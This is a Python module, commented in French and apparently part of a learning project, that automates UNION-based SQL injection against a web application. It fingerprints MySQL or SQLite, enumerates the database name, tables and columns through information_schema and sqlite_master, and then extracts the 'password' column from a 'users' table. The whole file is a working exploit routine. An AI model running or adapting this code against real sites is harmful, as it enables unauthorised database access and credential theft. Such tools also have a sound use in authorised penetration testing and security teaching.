#!/usr/bin/python3

class Union:
	class UnionException(Exception):
		pass

	def __init__(self, tester, column_counts):
		from program import final_archive
		from utils import Colors
		self.final_archive = final_archive

		self.final_archive.log(f"Starting UNION payload: {tester.payload}", Colors.GREEN, section="UNION PAYLOAD")
		self.submit = tester.submit
		self.delimiter = tester.delimiter
		self.header = self.delimiter + " UNION "
		self.comment = tester.payload

		self.original_text = tester.original_text
		self.normal_text = tester.normal_text
		self.column_counts = column_counts

		self.mysql = True
		self.table_name = None

	#Soumet une requête UNION.
	#But: construire et soumettre une requête SQL, puis de retourner la réponse brute et la requête.    
	#découvrir le nom des colonnes dans une table de base de données
	def submit_query(self, column_name, contents=""):
		#Générer une liste de valeurs NULL pour chaque colonne sauf une
		column_lst = ["null"] * (self.column_counts - 1)
		#Ajouter column_name à la fin de la liste de colonnes
		column_lst.append(column_name)
		#Convertir la liste column_lst en une chaîne de caractères séparée par des virgules
		colums = ", ".join(column_lst)
		#ex: " UNION SELECT null, null, null, column_name --"
		query = self.header + "SELECT " + colums + contents + self.comment
		return self.submit(query).text, query

	#Vérifie les résultats d'une requête UNION
	def check_union(self, column_name, compare):
		from utils import get_result
		response, query = self.submit_query(column_name)
		result = get_result(compare, response)
		return result

    #déterminer le type de base de données
	def get_version(self):
		from utils import Colors
		from program import final_archive
		#Cette requête est utilisée pour obtenir une réponse du serveur que l'on peut ensuite analyser
		response, query = self.submit_query("error")
		#Vérifier si la base de données est MySQL en utilisant la variable système @@version
		result = self.check_union("@@version", response)
		if result:
			self.final_archive.log(f"Database type detected: MYSQL", Colors.GREEN, section="DATABASE")
			return
		#Vérifier si la base de données est SQLite
		#sqlite_version() est une fonction spécifique à SQLite qui retourne la version actuelle de SQLite
		result = self.check_union("sqlite_version()", response)
		if result:
			self.final_archive.log(f"Database type detected: SQLite", Colors.GREEN, section="DATABASE")
			self.mysql = False

	#execute une requete personalisé UNION type et enregistre le result
	def exec_union(self, column_name, contents):
		from utils import Colors, get_result
		from program import final_archive
		#construire et soumettre la requête SQL. 
		#submit_query: retourne la réponse du serveur et la requête SQL complète utilisée.
		response, query = self.submit_query(column_name, contents)
		self.final_archive.log(f"Executed UNION QUERY: {query}", Colors.BROWN, section="UNION EXECUTION")
		#Comparaison du res de l'injection avec le res d'une requête normale
		#Si diff: l'injection SQL a réussi à récupérer des informations utiles
		result = get_result(self.original_text, response, query)
		if not result:
			raise self.UnionException("Colmuns count method does not work for this URL")
		self.final_archive.log(result, section="RESULT")

	#Ces fonctions get: : Exécutent des requêtes UNION pour récupérer des informations sur la base de données.
	def get_database_name(self):
		self.final_archive.log("Recuperation of the Database Name", section="DATABASE NAME")
		if self.mysql:
			self.exec_union("DATABASE()", "")
		else:
			#"sql" : Une colonne fictive utilisée pour construire la requête.
			#sqlite_schema : Une table système dans SQLite contenant des informations sur la base de données
			self.exec_union("sql", " FROM sqlite_schema")

	# Lit l'entrée utilisateur pour les noms de base de données, de tables et de colonnes
	# def read_input(self, name):
	# 	if not self.get_input:
	# 		return
	# 	data = input(f"Enter {name}: ")
	# 	return data    

	def get_table_names(self):
		#si db de type mysql
		self.final_archive.log("Recuperation of the Table Names", section="TABLE NAMES")
		if self.mysql:
			#demande à l'utilisateur de rentrer le nom de la db
			#Nom de la colonne à utiliser dans la requête SQL, table_name qui est spécifique à MySQL
			column_name = "table_name"
			#information_schema.tables : C'est une table système dans MySQL qui contient des informations sur toutes les tables de la base de données
			contents = " FROM information_schema.tables WHERE table_type='BASE TABLE'"
			#restreint les résultats à une seule base de données fournies par l'utilisateur
		else:
			#nom de la colonne dans sqlite_master qui contient les noms des tables
			column_name = "tbl_name"
			#sqlite_master: table système dans SQLite qui contient des informations sur toutes les tables, vues, index, et autres objets de la base de données
			contents = " FROM sqlite_master"
		self.exec_union(column_name, contents)

	def get_column_names(self):
		self.final_archive.log("Fetching Column Names", section="COLUMN NAMES")
		if self.mysql:
			column_name = "column_name"
			contents = " FROM information_schema.columns"
		else:
			column_name = "sql"
			contents = " FROM sqlite_master"
		self.exec_union(column_name, contents)    

	#récupérer toutes les données d'une colonne spécifique dans une table de la base de données, 
	#que ce soit MySQL ou SQLite. 
	def get_all_data(self):
		self.final_archive.log("Recuperation of all of the Data", section="ALL DATA")
		#De nombreuses applications et bases de données comportent une colonne nommée "password"
		#choix pratique et souvent pertinent pour les tests d'extraction de données
		column_name = "password"
		contents = f" FROM {self.table_name}"
		if not self.table_name:
			#"users" est une table couramment utilisée pour stocker les informations des utilisateurs dans les bases de données
			contents = f" FROM users"
		self.exec_union(column_name, contents)

	#Assure une séquence d'opérations pour interroger et récupérer des informations d'une base de données
	def union(self):
		from utils import error_exit, error_continue
		try:
			self.get_version()
			self.get_database_name()
			self.get_table_names()
			self.get_column_names()
			self.get_all_data()
		except self.UnionException as e:
			error_continue(e)
		except Exception as e:
			error_exit(e)